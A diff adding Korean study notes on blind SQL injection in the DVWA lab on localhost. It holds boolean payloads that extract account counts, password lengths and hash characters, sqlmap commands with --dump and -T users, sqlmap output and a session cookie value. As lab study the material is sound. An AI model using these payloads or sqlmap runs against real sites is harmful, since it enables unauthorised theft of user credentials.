@@ -1,0 +1,286 @@
+정상입력
+User ID exists in the database.
+비정상입력
+User ID is MISSING from the database.
+
+✅ 요약
+개념	설명
+Blind SQLi	결과가 출력되지 않고, 참/거짓만 확인 가능
+테스트 방법	조건문(AND 1=1, AND 1=2) 넣어서 반응 확인
+정보 추출	SUBSTRING, ASCII, LIMIT, OFFSET 등의 함수 사용
+
+결과가 바로 보이지 않음 (확인 어려움)
+
+자동화 도구 없이 하면 매우 느림
+
+그래서 실무에선 sqlmap 같은 툴로 자동화함
+
+목표: users 테이블에서 첫 번째 유저의 user 값을 한 글자씩 추출하기
+
+추천 페이로드 목록
+시도	페이로드
+기본 참 조건	1' AND 1=1 --
+OR로 참 만들기	1' OR 1=1 --
+주석 형태 다양화	1' AND 1=1 #
+숫자 ID 없을 때	0' OR 1=1 --
+
+이제 참 거짓을 알수 있다. 
+
+1' AND LENGTH(database())=6 -- (데이터베이스 이름 길이 추측)
+1' AND LENGTH(database())=4 -- 
+db 이름 길이는 4글자
+
+Blind SQL Injection 실습 순서 예시:
+
+1' AND 1=1 -- (참 조건 → 참 결과?)
+
+1' AND 1=2 -- (거짓 조건 → 거짓 결과?)
+
+1' AND LENGTH(database())=6 -- (데이터베이스 이름 길이 추측)
+
+1' AND SUBSTRING(database(),1,1)='d' -- (첫 글자 추측)
+
+1' AND ASCII(SUBSTRING(database(),1,1))=100 -- (ASCII 값으로 문자 알아내기)
+
+1. 자동화 도구 사용
+Blind SQLi는 보통 툴을 씁니다. 예:
+
+🛠️ sqlmap
+
+🐍 명령어 예시:
+
+bash
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=..." --level=5 --risk=3 --dbs
+이런 도구는 일일이 조건 넣지 않고도 알아서 패턴을 추측하고 정보를 추출합니다.
+
+2. 수동으로 하면? (훈련용)
+그래도 개념 익히고 싶다면, 가장 많이 쓰는 이진 검색 방식으로 하는 걸 추천해요:
+
+sql
+1' AND ASCII(SUBSTRING(database(),1,1)) > 100 -- 
+위 쿼리로:
+
+1번 글자의 ASCII 값이 100보다 큰지를 물어보고
+
+결과에 따라 범위를 절반씩 줄여나가며 확인합니다 (이진 탐색)
+
+목표	예시 페이로드
+계정 수 찾기	1' AND (SELECT COUNT(*) FROM users) = N --
+비번 길이 찾기	1' AND LENGTH((SELECT password FROM users LIMIT 1)) = N --
+비번 문자 찾기	1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) = 97 --
+
+Blind SQLi는 반복이 핵심이기 때문에, 자동화 도구 (sqlmap)가 실제 공격에서 많이 사용됩니다.
+
+
+🎯 목표: users 테이블의 계정 수(=비밀번호 개수) 알아내기
+📌 전제 조건
+DVWA → SQL Injection (Blind) → 난이도: Low
+
+응답 형태: "User ID exists in the database." (참) / "User ID is MISSING from the database." (거짓)
+
+🧭 단계별 시나리오
+✅ Step 1. 참/거짓 판별 기준 확인
+먼저 ID에 단순한 값 입력: 1
+
+참일 경우 → "User ID exists..."
+
+거짓일 경우 → "User ID is MISSING..."
+⇒ 이걸 기반으로 SQL 조건이 참인지 거짓인지 파악 가능
+
+✅ Step 2. users 테이블의 개수 찾기
+이제 SELECT COUNT(*)로 총 레코드 수 추측:
+
+sql
+복사
+편집
+1' AND (SELECT COUNT(*) FROM users) = 1 -- 
+결과: "MISSING" → 거짓 (레코드가 1개가 아님)
+
+sql
+복사
+편집
+1' AND (SELECT COUNT(*) FROM users) = 2 -- 
+결과: "MISSING" → 거짓
+
+...
+
+sql
+복사
+편집
+1' AND (SELECT COUNT(*) FROM users) = 5 -- 
+결과: "User ID exists..." → 참! ✅
+
+⇒ 🎉 users 테이블에 5개의 계정이 있다는 걸 알 수 있음!
+
+📌 보너스: 자동화 팁 (반복 줄이기)
+SQL을 반복해서 넣기 귀찮다면, sqlmap이라는 자동화 툴 사용 가능:
+
+bash
+복사
+편집
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="..." --level=2 --risk=1 --technique=B --dbms=MySQL --dump
+✅ 요약
+단계	내용	페이로드 예시
+1	응답 방식 확인	1
+2	계정 수 추측	1' AND (SELECT COUNT(*) FROM users) = N --
+3	참 응답에서 정답 도출	N = 실제 개수
+
+🎯 목표: users 테이블의 첫 번째 유저의 비밀번호 길이 찾기
+🧠 핵심 원리
+우리는 실제 값을 출력하지 못하므로, 참/거짓 응답으로만 정보를 추측해야 합니다.
+
+sql
+복사
+편집
+1' AND LENGTH((SELECT password FROM users LIMIT 1 OFFSET 0)) = N -- 
+LIMIT 1 OFFSET 0 → 첫 번째 유저의 비밀번호
+
+LENGTH(...) = N → 길이가 N이면 참
+
+
+✅ Step 1. 길이 추측 페이로드 입력
+DVWA → SQL Injection (Blind) → 입력창에:
+
+sql
+복사
+편집
+1' AND LENGTH((SELECT password FROM users LIMIT 1 OFFSET 0)) = 1 -- 
+❌ 거짓 (→ "MISSING")
+
+sql
+복사
+편집
+1' AND LENGTH((SELECT password FROM users LIMIT 1 OFFSET 0)) = 2 -- 
+❌ 거짓
+
+...
+
+sql
+복사
+편집
+1' AND LENGTH((SELECT password FROM users LIMIT 1 OFFSET 0)) = 32 -- 
+✅ 참! (→ "User ID exists...")
+
+🎉 첫 번째 계정의 비밀번호 길이는 32자리라는 것을 알아냄!
+
+🔁 반복으로 다음 계정도 확인 가능
+sql
+복사
+편집
+1' AND LENGTH((SELECT password FROM users LIMIT 1 OFFSET 1)) = ? -- 
+→ OFFSET만 바꾸면 됨 (1, 2, 3...)
+
+🧪 예시 페이로드
+➤ 1번째 글자가 'a'인지 확인
+sql
+복사
+편집
+1' AND SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0), 1, 1) = 'a' -- 
+❌ "MISSING" → 아니네
+
+계속 바꿔서 테스트
+
+sql
+복사
+편집
+1' AND SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0), 1, 1) = 'e' -- 
+✅ "User ID exists..." → 맞음!
+
+🎉 1번째 글자는 'e'!
+
+🔁 반복해서 32글자 알아내기
+2번째 글자
+
+sql
+복사
+편집
+1' AND SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0), 2, 1) = 'a' -- 
+또 반복…
+
+🛠 자동화 도움: 사용 가능한 문자 집합
+보통은 이 문자들만 사용돼요:
+
+복사
+편집
+0123456789abcdef
+(해시된 비밀번호이므로 hex(16진수) 사용)
+
+sql 사용법
+C:\Users\yuuki\GitProject\OWASP\2. SQL Injection (Blind)\sqlmap-master>python sqlmap.py -h
+
+python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID="f3bk7vpun31j47omipvavolhug"
+옵션 설명:
+옵션	설명
+-u	공격 대상 URL
+--cookie	로그인 세션 쿠키 전달
+--dump	데이터베이스 내용 추출
+--dbs	데이터베이스 목록 조회
+--tables	테이블 목록 조회
+--columns	열(column) 목록 조회
+--level, --risk	탐지 강도 설정 (1~5)
+
+✅ 로그인 세션 쿠키 확인 방법
+크롬 개발자 도구(F12) → Application 탭
+
+Cookies > http://localhost 선택
+
+PHPSESSID 값 복사
+
+
+예시 커맨드 (DB 이름 추출)
+bash
+복사
+편집
+python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID
+
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x717a6b7071,0x4f596a56636a70556f454743464b4b4b517872656d654f7873496c796c7a484b4942596c414b5253,0x717a786b71)#&Submit=Submit
+---
+[21:20:35] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.2.12, Apache 2.4.58
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[21:20:35] [INFO] fetched data logged to text files under 'C:\Users\yuuki\AppData\Local\sqlmap\output\localhost'
+
+[*] ending @ 21:20:35 /2025-05-26/
+
+결과 요약:
+DBMS: MySQL (MariaDB 계열)
+
+웹서버: Apache 2.4.58
+
+웹 애플리케이션: PHP 8.2.12
+
+페이로드: 인젝션이 잘 작동하여 CONCAT된 값을 반환함
+
+로그 파일 위치:
+
+lua
+복사
+편집
+C:\Users\yuuki\AppData\Local\sqlmap\output\localhost
+
+음에 할 수 있는 것들
+데이터베이스 목록 확인
+
+bash
+복사
+편집
+python sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." --dbs
+특정 DB의 테이블 목록 확인
+예: dvwa 데이터베이스
+
+bash
+복사
+편집
+python sqlmap.py -u "..." --cookie="..." -D dvwa --tables
+users 테이블의 컬럼 확인
+
+bash
+복사
+편집
+python sqlmap.py -u "..." --cookie="..." -D dvwa -T users --columns
+데이터 추출 (예: 사용자 ID, 비밀번호 등)
+
+bash
+복사
+편집
+python sqlmap.py -u "..." --cookie="..." -D dvwa -T users --dump
